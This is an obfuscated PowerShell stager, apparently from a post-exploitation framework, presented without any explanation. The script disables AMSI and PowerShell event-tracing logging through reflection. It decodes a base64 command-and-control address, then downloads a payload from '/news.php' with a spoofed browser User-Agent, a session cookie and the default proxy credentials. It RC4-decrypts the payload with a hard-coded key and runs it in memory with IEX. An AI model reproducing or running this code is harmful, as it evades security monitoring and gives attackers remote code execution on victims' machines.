IF($PSVErSioNTabLe.PSVErSIoN.Major -GE 3){$REf=[Ref].AssEMBly.GEtTyPE('System.Management.Automation.Amsi'+'Utils');
$Ref.GeTFIeLd('amsiInitF'+'ailed','NonPublic,Static').SetValue($NuLl,$TruE);
[System.Diagnostics.Eventing.EventProvider]."GetFie`ld"('m_e'+'nabled','Non'+'Public,'+'Instance').SetValue([Ref].Assembly.GetType('Syste'+'m.Management.Automation.Tracing.PSE'+'twLogProvider')."GetFie`ld"('et'+'wProvider','NonPub'+'lic,S'+'tatic').GetValue($null),0);};
[SYStEM.NEt.SERVICePOiNTMANager]::ExPEct100ConTiNUe=0;$b3904=NEw-ObJecT SystEM.NeT.WEbCliENT;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$ser=$([TEXT.ENCOdiNg]::UNiCoDe.GEtSTrINg([CONVeRT]::FrOMBAse64STring('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANwA0AC4AMQAyADkAOgA4ADkAOAA0AA==')));
$B3904.PRoXy=[SYSteM.NET.WeBREQuest]::DEFAULtWEBPRoxy;
$b3904.PRoxy.CReDeNtIALs = [SyStEM.NET.CREDENTiaLCacHE]::DeFAUltNEtworKCReDENTIAlS;$Script:Proxy = $b3904.Proxy;
$K=[SySTem.TEXT.EnCodiNg]::ASCII.GEtBYTeS('v[IGTbf*XkN)#MCu39!Hp>PmS2%E;LUF');
$R={$D,$K=$ARgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COUnt])%256;
$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;
$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXoR$S[($S[$I]+$S[$H])%256]}};
$B3904.HEADErS.AdD("Cookie","UAjItyKMiTVnfjJU=x5V63iPZtPBT/X1N0RypG/xlheo=");
$t='/news.php';$B3904.HeADERS.ADD('User-Agent',$u);
$daTa=$b3904.DoWNloaDDaTa($seR+$T);$iv=$datA[0..3];
$data=$dATa[4..$DaTa.lENgtH];-JoiN[ChaR[]](& $R $DAtA ($IV+$K))|IEX
